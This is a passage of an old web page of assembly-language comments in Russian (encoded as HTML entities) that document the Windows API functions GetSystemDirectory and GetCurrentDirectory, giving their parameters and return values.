 ;   &#1089;&#1082;&#1086;&#1087;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1085;&#1086;&#1081; &#1074; &#1073;&#1091;&#1092;&#1077;&#1088; &#1089;&#1090;&#1088;&#1086;&#1082;&#1080; &#1074; &#1089;&#1080;&#1084;&#1074;&#1086;&#1083;&#1072;&#1093;, &#1085;&#1077; &#1074;&#1082;&#1083;&#1102;&#1095;&#1072;&#1103; &#1079;&#1072;&#1074;&#1077;&#1088;&#1096;&#1072;&#1102;&#1097;&#1080;&#1081; &#1089;&#1080;&#1084;&#1074;&#1086;&#1083; ;
 ;   NULL.                                                                  ;
 ;  &#1045;&#1089;&#1083;&#1080; &#1076;&#1083;&#1080;&#1085;&#1072; &#1073;&#1086;&#1083;&#1100;&#1096;&#1077; &#1088;&#1072;&#1079;&#1084;&#1077;&#1088;&#1072; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072;, &#1090;&#1086; &#1074;&#1086;&#1079;&#1074;&#1088;&#1072;&#1097;&#1072;&#1077;&#1084;&#1086;&#1077; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077; - &#1101;&#1090;&#1086;       ;
 ;   &#1090;&#1088;&#1077;&#1073;&#1091;&#1077;&#1084;&#1099;&#1081; &#1088;&#1072;&#1079;&#1084;&#1077;&#1088; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072;.                                               ;
 ;                                                                          ;
 ; ---                                                                      ;
 ;                                                                          ;
 ; &#1060;&#1091;&#1085;&#1082;&#1094;&#1080;&#1103; GetSystemDirectory &#1087;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1090; &#1087;&#1091;&#1090;&#1100; &#1082; &#1089;&#1080;&#1089;&#1090;&#1077;&#1084;&#1085;&#1086;&#1081; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1080; Windows. ;
 ; &#1057;&#1080;&#1089;&#1090;&#1077;&#1084;&#1085;&#1072;&#1103; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1103; &#1089;&#1086;&#1076;&#1077;&#1088;&#1078;&#1080;&#1090; &#1076;&#1088;&#1072;&#1081;&#1074;&#1077;&#1088;&#1072;, &#1073;&#1080;&#1073;&#1083;&#1080;&#1086;&#1090;&#1077;&#1082;&#1080; Windows &#1080; &#1092;&#1072;&#1081;&#1083;&#1099;       ;
 ; &#1096;&#1088;&#1080;&#1092;&#1090;&#1086;&#1074;.                                                                 ;
 ;                                                                          ;
 ; UINT GetSystemDirectory(                                                 ;
 ;   LPTSTR lpBuffer,    // &#1072;&#1076;&#1088;&#1077;&#1089; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072;                                    ;
 ;   UINT uSize  // &#1088;&#1072;&#1079;&#1084;&#1077;&#1088; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072;                                           ;
 ;  );                                                                      ;
 ;                                                                          ;
 ;                                                                          ;
 ; &#1055;&#1072;&#1088;&#1072;&#1084;&#1077;&#1090;&#1088;&#1099;                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ;  lpBuffer: &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090; &#1085;&#1072; &#1073;&#1091;&#1092;&#1077;&#1088;, &#1074; &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081; &#1073;&#1091;&#1076;&#1077;&#1090; &#1087;&#1086;&#1084;&#1077;&#1097;&#1077;&#1085; &#1087;&#1091;&#1090;&#1100; &#1082; &#1089;&#1080;&#1089;&#1090;&#1077;&#1084;&#1085;&#1086;&#1081; ;
 ;   &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1080;. &#1058;&#1072;&#1082; &#1078;&#1077; &#1082;&#1072;&#1082; &#1080; &#1074; &#1087;&#1088;&#1077;&#1076;&#1099;&#1076;&#1091;&#1097;&#1077;&#1084; &#1089;&#1083;&#1091;&#1095;&#1072;&#1077; &#1087;&#1091;&#1090;&#1100; &#1085;&#1077; &#1073;&#1091;&#1076;&#1077;&#1090;             ;
 ;   &#1079;&#1072;&#1082;&#1072;&#1085;&#1095;&#1080;&#1074;&#1072;&#1090;&#1100;&#1089;&#1103; &#1089;&#1083;&#1077;&#1096;&#1077;&#1084;, &#1077;&#1089;&#1083;&#1080; &#1090;&#1086;&#1083;&#1100;&#1082;&#1086; &#1089;&#1080;&#1089;&#1090;&#1077;&#1084;&#1085;&#1072;&#1103; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1103; &#1085;&#1077; &#1103;&#1074;&#1083;&#1103;&#1077;&#1090;&#1089;&#1103;     ;
 ;   &#1082;&#1086;&#1088;&#1085;&#1077;&#1074;&#1086;&#1081;.                                                              ;
 ;                                                                          ;
 ;  uSize: &#1079;&#1072;&#1076;&#1072;&#1077;&#1090; &#1084;&#1072;&#1082;&#1089;&#1080;&#1084;&#1072;&#1083;&#1100;&#1085;&#1099;&#1081; &#1088;&#1072;&#1079;&#1084;&#1077;&#1088; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072; &#1074; &#1089;&#1080;&#1084;&#1074;&#1086;&#1083;&#1072;&#1093;. &#1069;&#1090;&#1086; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077;      ;
 ;   &#1076;&#1086;&#1083;&#1078;&#1085;&#1086; &#1073;&#1099;&#1090;&#1100; &#1085;&#1077; &#1084;&#1077;&#1085;&#1100;&#1096;&#1077; MAX_PATH.                                        ;
 ;                                                                          ;
 ; &#1042;&#1086;&#1079;&#1074;&#1088;&#1072;&#1097;&#1072;&#1077;&#1084;&#1099;&#1077; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1103;                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ;  &#1045;&#1089;&#1083;&#1080; &#1074;&#1099;&#1079;&#1086;&#1074; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; &#1087;&#1088;&#1086;&#1096;&#1077;&#1083; &#1091;&#1089;&#1087;&#1077;&#1096;&#1085;&#1086;, &#1074;&#1086;&#1079;&#1074;&#1088;&#1072;&#1097;&#1072;&#1077;&#1084;&#1086;&#1077; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077; - &#1101;&#1090;&#1086; &#1076;&#1083;&#1080;&#1085;&#1072;   ;
 ;   &#1089;&#1082;&#1086;&#1087;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1085;&#1086;&#1081; &#1074; &#1073;&#1091;&#1092;&#1077;&#1088; &#1089;&#1090;&#1088;&#1086;&#1082;&#1080; &#1074; &#1089;&#1080;&#1084;&#1074;&#1086;&#1083;&#1072;&#1093;, &#1085;&#1077; &#1074;&#1082;&#1083;&#1102;&#1095;&#1072;&#1103; &#1079;&#1072;&#1074;&#1077;&#1088;&#1096;&#1072;&#1102;&#1097;&#1080;&#1081; &#1089;&#1080;&#1084;&#1074;&#1086;&#1083; ;
 ;   NULL. &#1045;&#1089;&#1083;&#1080; &#1076;&#1083;&#1080;&#1085;&#1072; &#1073;&#1086;&#1083;&#1100;&#1096;&#1077; &#1088;&#1072;&#1079;&#1084;&#1077;&#1088;&#1072; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072;, &#1090;&#1086; &#1074;&#1086;&#1079;&#1074;&#1088;&#1072;&#1097;&#1072;&#1077;&#1084;&#1086;&#1077; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077; - &#1101;&#1090;&#1086; ;
 ;   &#1090;&#1088;&#1077;&#1073;&#1091;&#1077;&#1084;&#1099;&#1081; &#1088;&#1072;&#1079;&#1084;&#1077;&#1088; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072;.                                               ;
 ;                                                                          ;
 ; ---                                                                      ;
 ;                                                                          ;
 ; &#1060;&#1091;&#1085;&#1082;&#1094;&#1080;&#1103; GetCurrentDirectory &#1087;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1090; &#1090;&#1077;&#1082;&#1091;&#1097;&#1091;&#1102; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1102; &#1076;&#1083;&#1103; &#1090;&#1077;&#1082;&#1091;&#1097;&#1077;&#1075;&#1086;     ;
 ; &#1087;&#1088;&#1086;&#1094;&#1077;&#1089;&#1089;&#1072;.                                                                ;
 ;                                                                          ;
 ; DWORD GetCurrentDirectory(                                               ;
 ;   DWORD nBufferLength,        // &#1088;&#1072;&#1079;&#1084;&#1077;&#1088; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072; &#1074; &#1089;&#1080;&#1084;&#1074;&#1086;&#1083;&#1072;&#1093;                ;
 ;   LPTSTR lpBuffer     // &#1072;&#1076;&#1088;&#1077;&#1089; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072;                                    ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; &#1055;&#1072;&#1088;&#1072;&#1084;&#1077;&#1090;&#1088;&#1099;                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ;  nBufferLength: &#1079;&#1072;&#1076;&#1072;&#1077;&#1090; &#1076;&#1083;&#1080;&#1085;&#1091; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072;, &#1074; &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081; &#1073;&#1091;&#1076;&#1077;&#1090; &#1087;&#1086;&#1084;&#1077;&#1097;&#1077;&#1085; &#1087;&#1091;&#1090;&#1100; &#1082;     ;
 ;   &#1090;&#1077;&#1082;&#1091;&#1097;&#1077;&#1081; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1080;. &#1044;&#1086;&#1083;&#1078;&#1077;&#1085; &#1091;&#1095;&#1080;&#1090;&#1099;&#1074;&#1072;&#1090;&#1100;&#1089;&#1103; &#1079;&#1072;&#1074;&#1077;&#1088;&#1096;&#1072;&#1102;&#1097;&#1080;&#1081; &#1089;&#1080;&#1084;&#1074;&#1086;&#1083; NULL.        ;
 ;                                                                          ;
 ;  lpBuffer: &#1079;&#1072;&#1076;&#1072;&#1077;&#1090; &#1072;&#1076;&#1088;&#1077;&#1089; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072;. &#1055;&#1086;&#1083;&#1091;&#1095;&#1077;&#1085;&#1085;&#1072;&#1103; &#1089;&#1090;&#1088;&#1086;&#1082;&#1072; &#1073;&#1091;&#1076;&#1077;&#1090; &#1072;&#1073;&#1089;&#1086;&#1083;&#1102;&#1090;&#1085;&#1099;&#1084;      ;
 ;   &#1087;&#1091;&#1090;&#1077;&#1084; &#1082; &#1090;&#1077;&#1082;&#1091;&#1097;&#1077;&#1081; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1080;.                                            ;
 ;                                                                          ;
 ; &#1042;&#1086;&#1079;&#1074;&#1088;&#1072;&#1097;&#1072;&#1077;&#1084;&#1099;&#1077; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1103;                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ;  &#1045;&#1089;&#1083;&#1080; &#1074;&#1099;&#1079;&#1086;&#1074; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; &#1087;&#1088;&#1086;&#1096;&#1077;&#1083; &#1091;&#1089;&#1087;&#1077;&#1096;&#1085;&#1086;, &#1074;&#1086;&#1079;&#1074;&#1088;&#1072;&#1097;&#1072;&#1077;&#1084;&#1086;&#1077; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077; &#1079;&#1072;&#1076;&#1072;&#1077;&#1090;        ;
 ;   &#1082;&#1086;&#1083;&#1080;&#1095;&#1077;&#1089;&#1090;&#1074;&#1086; &#1089;&#1080;&#1084;&#1074;&#1086;&#1083;&#1086;&#1074;, &#1079;&#1072;&#1087;&#1080;&#1089;&#1072;&#1085;&#1085;&#1099;&#1093; &#1074; &#1073;&#1091;&#1092;&#1077;&#1088; (&#1079;&#1072;&#1074;&#1077;&#1088;&#1096;&#1072;&#1102;&#1097;&#1080;&#1081; &#1089;&#1080;&#1084;&#1074;&#1086;&#1083; NULL &#1085;&#1077;    ;
 ;   &#1091;&#1095;&#1080;&#1090;&#1099;&#1074;&#1072;&#1077;&#1090;&#1089;&#1103;.                                                           ;
 ;--------------------------------------------------;</b></font></pre>
<!--mstheme--><font face="Arial, Arial, Helvetica"></code><!--mstheme--></font>

</body>

</html>
